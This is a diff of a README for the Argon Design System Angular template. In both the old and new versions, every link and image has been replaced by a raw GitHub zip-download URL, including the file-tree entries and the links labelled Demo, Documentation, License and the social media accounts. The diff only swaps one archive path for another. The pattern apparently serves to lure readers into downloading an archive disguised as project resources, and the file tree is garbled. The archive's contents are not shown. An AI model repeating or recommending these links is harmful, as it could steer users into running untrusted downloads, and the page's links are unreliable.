-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── modal
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── navigation-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── nucleo-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── tabs-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── typography-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   └── versions-section
-│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │       └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │       └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   ├── shared
 │   │   │   ├── footer
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   └── navbar
-│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │       └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │       └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   └── signup
-│   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │       └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │       ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │       └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   ├── assets
 │   │   ├── css
 │   │   ├── img
 │   │   ├── js
 │   │   ├── scss
 │   │   │   ├── angular
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── bootstrap
 │   │   │   └── custom
 │   │   └── vendor
 │   ├── browserslist
 │   ├── environments
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-└── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+└── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 
 ```
 
@@ -219,51 +219,51 @@ argon-design-system-angular
 
 At present, we officially aim to support the last two versions of the following browsers:
 
-<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="64" height="64">
+<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="64" height="64"> <img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="64" height="64">
 
 
 
 ## Resources
-- Demo: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
-- Download Page: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
-- Documentation: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
-- License Agreement: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
-- Support: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
-- Issues: [Github Issues Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+- Demo: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
+- Download Page: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
+- Documentation: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
+- License Agreement: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
+- Support: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
+- Issues: [Github Issues Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 ## Reporting Issues
 
 We use GitHub Issues as the official bug tracker for the Argon Design System Angular. Here are some advices for our users that want to report an issue:
 
-1. Make sure that you are using the latest version of the Argon Design System Angular. Check the CHANGELOG from your kit on our [website](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip).
+1. Make sure that you are using the latest version of the Argon Design System Angular. Check the CHANGELOG from your kit on our [website](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip).
 2. Providing us reproducible steps for the issue will shorten the time it takes for it to be fixed.
 3. Some issues may be browser specific, so specifying in what browser you encountered the issue might help.
 
 ## Licensing
 
-- Copyright 2019 Creative Tim (https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+- Copyright 2019 Creative Tim (https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
-- Licensed under MIT (https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+- Licensed under MIT (https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 ## Useful Links
 
-- [Tutorials](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
-- [Affiliate Program](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) (earn money)
-- [Blog Creative Tim](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
-- [Free Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) from Creative Tim
-- [Premium Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) from Creative Tim
-- [React Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) from Creative Tim
-- [Angular Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) from Creative Tim
-- [VueJS Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) from Creative Tim
-- [More products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) from Creative Tim
-- Check our Bundles [here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+- [Tutorials](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
+- [Affiliate Program](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) (earn money)
+- [Blog Creative Tim](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
+- [Free Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) from Creative Tim
+- [Premium Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) from Creative Tim
+- [React Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) from Creative Tim
+- [Angular Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) from Creative Tim
+- [VueJS Products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) from Creative Tim
+- [More products](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) from Creative Tim
+- Check our Bundles [here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 ### Social Media
 
-Twitter: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
+Twitter: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
 
-Facebook: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
+Facebook: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
 
-Dribbble: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
+Dribbble: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
 
-Instagram: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip>
+Instagram: <https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip>
